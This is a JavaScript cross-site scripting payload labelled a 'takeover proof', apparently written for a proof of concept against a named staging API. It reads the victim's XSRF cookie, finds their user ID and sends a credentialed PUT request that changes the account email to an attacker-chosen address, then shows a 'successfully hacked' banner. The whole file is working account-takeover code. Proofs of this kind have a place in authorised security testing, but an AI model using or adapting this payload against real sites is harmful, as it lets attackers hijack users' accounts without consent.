// e.js - Takeover Proof (No external server needed)

(function() {
    if (window.__xss_done) return;
    window.__xss_done = true;

    // 1. Get CSRF token (not HttpOnly, readable)
    function getCookie(name) {
        const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
        return match ? decodeURIComponent(match[2]) : null;
    }
    const xsrfToken = getCookie('__Secure-XSRF_TOKEN') || getCookie('Secure-XSRF_TOKEN');

    // 2. Try to get user ID from the page or URL
    function getUserId() {
        const urlMatch = window.location.pathname.match(/\/users\/([a-f0-9-]{36})/i);
        if (urlMatch) return urlMatch[1];
        const input = document.querySelector('input[name="id"], [data-user-id]');
        if (input && input.value) return input.value;
        return null;
    }

    const userId = getUserId();
    if (!userId) {
        // Fallback: try to fetch /api/v1/users/me (but may have CORS)
        fetch('/api/v1/users/me', { credentials: 'include' })
            .then(r => r.json())
            .then(data => {
                const id = data.id || data.user?.id || data.data?.id;
                if (id) doTakeover(id, xsrfToken);
            })
            .catch(() => { /* silent fail */ });
        return;
    }

    function doTakeover(id, token) {
        // 3. Send the update request (browser automatically sends HttpOnly session)
        fetch('https://basilstagingapi.coraltreetech.com/api/v1/users/' + id, {
            method: 'PUT',
            credentials: 'include',
            headers: {
                'Content-Type': 'application/json',
                'X-Xsrf-Token': token || ''
            },
            body: JSON.stringify({
                user: {
                    first_name: 'HACKED_BY_XSS',
                    email: 'pwned@example.com'   // Change to your email if you want
                }
            })
        })
        .then(response => {
            // 4. Show result on the page (no external exfil needed)
            const status = response.status;
            const msg = (status === 200 || status === 204) 
                ? '✅ Account successfully hacked! Check your profile.' 
                : '❌ Update failed (status ' + status + '). Check console.';
            showMessage(msg, status === 200 ? 'green' : 'red');
        })
        .catch(err => {
            showMessage('❌ Error: ' + err.message, 'red');
        });
    }

    // 5. Helper to display a floating message
    function showMessage(text, color) {
        const div = document.createElement('div');
        div.style.cssText = 'position:fixed;top:20px;left:50%;transform:translateX(-50%);background:' + (color || '#333') + ';color:white;padding:20px 40px;z-index:9999999;font-size:18px;font-weight:bold;border-radius:10px;box-shadow:0 4px 20px rgba(0,0,0,0.5);border:2px solid white;text-align:center;';
        div.textContent = text;
        document.body.appendChild(div);
        // Auto-remove after 10 seconds
        setTimeout(() => div.remove(), 10000);
    }

    // 6. If we have userId, start takeover
    if (userId) doTakeover(userId, xsrfToken);
})();
